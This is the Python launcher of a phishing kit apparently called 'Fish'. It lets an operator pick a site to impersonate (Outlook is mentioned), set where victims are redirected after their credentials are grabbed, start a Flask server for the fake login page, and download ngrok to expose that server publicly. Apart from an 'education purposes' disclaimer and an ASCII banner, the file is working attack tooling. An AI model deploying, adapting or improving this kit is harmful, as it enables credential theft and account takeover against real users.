import zipfile
import stat
import signal
import requests
import utils
import colorama
import os


from colorama import Fore, Back, Style
from os import system
from sys import platform
from threading import Thread
from sites import siteLookUp
from tqdm import tqdm



# Want to contribute? Make a fork and a pull request to the dev branch! I made the logo on placeit and converted into using https://www.text-image.com/convert/ascii.html. Thanks!! please star
ascii = """
                                                                              [[b]]NN
                                                                            [[b]]Ns[[blu]]sdN [[b]] N
                                                                            [[b]]hs[[blu]]ym  mmmm[[b]]NN
                                                                            [[b]]ys[[blu]]ym  mmNN  Nmm[[b]]NN
                                                                            [[b]]ys[[blu]]ym  mN [[g]] NN[[blu]]  mdmmm[[b]]NN
                                                                            [[b]]ys[[blu]]ym  mN [[g]] N [[blu]]  mdddddmmmNN
                                                                         [[b]]N  y[[blu]]sym   mmNNNmmddddmNNmddmmmN    myy[[b]]yd
                                                                     [[b]]N  N[[blu]]m  yshm   NmdddddddmmNN  mddddddmN Nd+`/[[b]]dN
                                                                    [[b]]NN[[blu]]NNNN  dhdm    mdddddddN [[w]] mN[[blu]]  mddd[[w]]sssyhmN m[[blu]]o-[[b]]-N
                                                                      [[b]]my[[blu]]ssh  NN  yN NdddddddN [[w]] mmN[[blu]]  mddh[[w]]sssssydN Ny[[blu]]yh[[b]]dm
                                                                       [[b]]my[[blu]]/.:shhs:`N Nmmmmmmm [[w]]  mmm[[blu]]  Nmdddy[[w]]sssssydN[[blu]] No[[b]].h
                                                                          [[b]]Nh[[blu]]+-    y  NNNNNN  [[w]] NmddN[[blu]] mdddddy[[w]]sssssymN[[blu]] h:[[b]]od
                                                                             [[b]]Nd[[blu]]o-`:NN      [[w]] NNmmmN[[blu]]   mdddddddhy[[w]]ssshmN[[blu]] m:[[b]]-N
                                                                                [[b]]Nd[[blu]]mmmmmNN           Nmdddddddddd[[w]]hyddmm[[blu]] N[[b]]hd
                                                                                  [[b]]Nm[[blu]]mmmmmmNNNNNNN  Nmmdddddddddddd[[w]]yyydmm[[blu]][[b]] hy
                                                                                   [[b]]NN[[blu]]NNNNNNNNNN  dmNmmmmmmmmmdddddy[[w]]sshdmN[[b]] N
                                                                                         [[b]]NN[[blu]]NNNdy/+m  [[w]] NNNNN[[blu]] Nmdddddhyddd[[b]]mN
                                                                                        [[b]]m/[[blu]]::--.`y [[w]] NN Nhs+/y[[blu]]  mddddddddd[[b]]dm
                                                                                         [[b]]md[[blu]]o`   :d[[w]] d//shmNmN[[blu]] Nddddddddddd[[b]]dm
                                                                                            [[b]]h-  [[blu]] `sNNhsohN[[blu]]  Nmdddddddddddd[[b]]dN
                                                                                             Ns[[blu]].  [[w]] -/syyyosN[[blu]] Nmmddddddddddd[[b]]N[[blu]]==[[b]]N
                                                                                              [[w]]NNs-[[blu]]  [[w]] `````[[blu]] .sm NNmmmddddddd[[b]]m[[blu]]p/+[[]b]d
                                                                                              [[w]]ysmNh/`[[blu]]        `/sdN Nmdddddd[[b]]m[[blu]]`/:[[b]]`y
                                                                                              [[w]]N:.y[[blu]]  my/.`        .s  mddddd[[b]]m[[blu]]\`/:[[b]] `d
                                                                                               [[w]]NoN[[blu]]     Nhs/.`      ymmddddd[[b]]m[[blu]]p;/"[[b]]` /
                                                                                                            [[b]]mh[[blu]]-   `-+NNNmdd[[b]]m[[blu]]p:-`[[b]]/-
                                                                                                         [[b]]Nm[[blu]]NNNhoohm NN  mdd[[b]]N[[blu]]m`=[[b]]`/
                                                                                                          [[b]]mm[[blu]]NN  m  m-N Ndd[[b]]m[[blu]]\`/`[[b]]-m
                                                                                                          [[b]]NN[[blu]]   d/  -o  md[[b]]m[[blu]]--d+o[[b]]hN
                                                                                                            [[b]]d  +[[blu]]y h d Nmm
                                                                                                           [[b]]o   /[[blu]]d s`m NN
                                                                                                          [[b]]m. d[[blu]] yy d`o
                                                                                                       [[b]]Nh[[blu]] m:/  y  yN
                                                                                                        [[b]]s:[[blu]]sN hy
                                                                                        [[w]]NdN           [[blu]]N
                                                                                         [[w]]do/+ooss[[c]]yydm

[[c]]                 _____ _                                                    _                           _                 _       _               _     _     _     _               _              _
[[c]]                |_   _| |                               ___                | |                         | |               | |     | |             | |   (_)   | |   (_)             | |            | |
[[c]]                  | | | |__   ___    ___  _ __   ___   ( _ )     ___  _ __ | |_   _   _   _ _ __ ______| |_ ___ ______ __| | __ _| |_ ___   _ __ | |__  _ ___| |__  _ _ __   __ _  | |_ ___   ___ | |
[[c]]                  | | | '_ \ / _ \  / _ \| '_ \ / _ \  / _ \/\  / _ \| '_ \| | | | | | | | | '_ \______| __/ _ \______/ _` |/ _` | __/ _ \ | '_ \| '_ \| / __| '_ \| | '_ \ / _` | | __/ _ \ / _ \| |
[[c]]                  | | | | | |  __/ | (_) | | | |  __/ | (_>  < | (_) | | | | | |_| | | |_| | |_) |     | || (_) |    | (_| | (_| | ||  __/ | |_) | | | | \__ \ | | | | | | | (_| | | || (_) | (_) | |
[[c]]                  \_/ |_| |_|\___|  \___/|_| |_|\___|  \___/\/  \___/|_| |_|_|\__, |  \__,_| .__/       \__\___/      \__,_|\__,_|\__\___| | .__/|_| |_|_|___/_| |_|_|_| |_|\__, |  \__\___/ \___/|_|
[[c]]                                                                               __/ |       | |                                             | |                               __/ |
[[c]]                                                                              |___/        |_|                                             |_|                              |___/
[[y]] Made by aarav2you
[[y]] Made by Kritagyaispro

[[c-bg]]_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.- [[:: FISH ::]] '~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~"""
                                    ############################################################# Parameters and configuration #############################################################
# We aren't responsible for anything you decide to do. This is only for education purposes.

#### Initializes colorama
colorama.init(autoreset=True)

#### Detects SIGINT
def signal_handler(sig, frame):
    print(Fore.RED + '\nExiting...(You pressed Ctrl+C)')
    exit()

signal.signal(signal.SIGINT, signal_handler)

#### Detects the Operating System
if platform == "linux" or platform == "linux2" or platform == "darwin":
    from commands import unixCommands as commands
elif platform == "win32":
    from commands import windowsCommands as commands
else:
    raise LookupError("Unable to detect operating system! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title=")

#### Ngrok download links (Try to implement all)
windows64 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
windows64_name = "ngrok-stable-windows-amd64.zip"

windows32 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-386.zip"
windows32_name = "ngrok-stable-windows-386.zip"

macOS = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip"
macOs_name = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip"

linux64 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
linux64_name = "ngrok-stable-linux-amd64.zip"

linux32 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
linux32_name = "ngrok-stable-linux-386.zip"

linuxARM = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip"
linuxARM_name = "ngrok-stable-linux-arm.zip"

linuxARM64 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.tgz"
linuxARM64_name = "ngrok-stable-linux-arm64.tgz"

freeBSD64 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-freebsd-amd64.zip"
freeBSD64_name = "ngrok-stable-freebsd-amd64.zip"

freeBSD64 = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-freebsd-386.zip"
freeBSD64_name = "ngrok-stable-freebsd-386.zip"

#### Clears the console and prints the ASCII art
os.system(commands.clear)
print(utils.color.colorText(ascii))

                                    ############################################################# Questions/ Input #############################################################
#### Prints options
for site in siteLookUp:
    print('\n' + Fore.RED + "[" + Fore.CYAN + str(site) + Fore.RED + "]" + Fore.BLUE + f" {siteLookUp[site]}")

#### Selects the site to create a phishing page for (currently Outlook)
site = int(input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Choose an option: ") or 1)

#### Selects the vicitim would be redirected to after the credientials are grabbed
redirect_url = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Enter redirect url:" + Fore.YELLOW + " (https://www.office.com/?auth=2)" + Fore.GREEN + ": ") or "https://www.office.com/?auth=2"

#### Selects the host to run the flask server to run on, you can use private IP to be available in LAN
host = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Flask server host" + Fore.YELLOW + " (localhost)" + Fore.GREEN + ": ") or "localhost"

#### Selects the port for flask server to run on
port = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Flask server port" + Fore.YELLOW + " (49467)" + Fore.GREEN + ": ") or 49467

#### Determines to use ngrok or not
ngrok = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Use ngrok?" + Fore.YELLOW + " (y/n)" + Fore.GREEN + ": ") or "n"

                                     ############################################################# Execution #############################################################

#### 
def exec(site):
    try:
        siteName = siteLookUp[site]
    except KeyError:
        raise LookupError("Error! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title")

    path = os.path.join('Sites', siteName, "app.py") #Using this instead of a string to be more portable and possibly prevent issues
#### Detects the site chosen to create a phishing page for and executes app.py
# Possibly needing error handling over here
    os.system(f"{commands.clear} && python {path} {redirect_url} {host} {port}")


#### Deploys/starts the server
if ngrok == "y":
    if platform == "win32":
        if system("ngrok > NUL") == 0:
            Thread(target=os.system(f"ngrok http {port}"), args=(port,)).start()
            print("\n\n\n\n\n")
            Thread(target=exec, args=(site, )).start()                   
        else:
            print("Downloading nGrok...")
            with open(windows64.split('/')[-1], 'wb') as download_ngrok:
                for progressbar in tqdm(iterable = requests.get(windows64, stream = True).iter_content(chunk_size = 1024), total = int(requests.get(windows64, stream = True).headers['content-length'])/1024, unit = 'KB'):
                    download_ngrok.write(progressbar)
            with zipfile.ZipFile(windows64_name,"r") as unzip:
                unzip.extractall()
                unzip.close()
                os.remove(windows64_name)
                Thread(target=os.system(f"ngrok http {port}"), args=(port,)).start()
                print("\n\n\n\n\n")
                Thread(target=exec, args=(site, )).start()                                    


    if platform == "linux" or platform == "linux2":
        if system("ngrok > NUL") == 0:
            Thread(target=os.system(f"./ngrok http {port}"), args=(port,)).start()
            print("\n\n\n\n\n")
            Thread(target=exec, args=(site, )).start()          
        else:
            print("Downloading nGrok...")
            with open(linux64.split('/')[-1], 'wb') as download_ngrok:
                for progressbar in tqdm(iterable = requests.get(linux64, stream = True).iter_content(chunk_size = 1024), total = int(requests.get(linux64, stream = True).headers['content-length'])/1024, unit = 'KB'):
                    download_ngrok.write(progressbar)
            with zipfile.ZipFile(linux64_name,"r") as unzip:
                unzip.extractall()
                unzip.close()
                os.remove(linux64_name)
                os.chmod('ngrok', os.stat('ngrok').st_mode | stat.S_IEXEC)
                Thread(target=os.system(f"./ngrok http {port}"), args=(port,)).start()
                print("\n\n\n\n\n")
                Thread(target=exec, args=(site, )).start                   
                
    if platform == "darwin":
        if system("ngrok > NUL") == 0:
            Thread(target=os.system(f"./ngrok http {port}"), args=(port,)).start()
            Thread(target=exec, args=(site, )).start()
        else:
            print("Downloading nGrok...")
            with open(macOS.split('/')[-1], 'wb') as download_ngrok:
                for progressbar in tqdm(iterable = requests.get(macOS, stream = True).iter_content(chunk_size = 1024), total = int(requests.get(macOS, stream = True).headers['content-length'])/1024, unit = 'KB'):
                    download_ngrok.write(progressbar)
            with zipfile.ZipFile(macOs_name,"r") as unzip:
                unzip.extractall()
                unzip.close()
                os.remove(macOs_name)
                os.chmod('ngrok', os.stat('ngrok').st_mode | stat.S_IEXEC)
                Thread(target=os.system(f"./ngrok http {port}"), args=(port,)).start()
                print("\n\n\n\n\n")
                Thread(target=exec, args=(site, )).start()                  

else:
    Thread(target=exec, args=(site, )).start()

                                    ############################################################# END #############################################################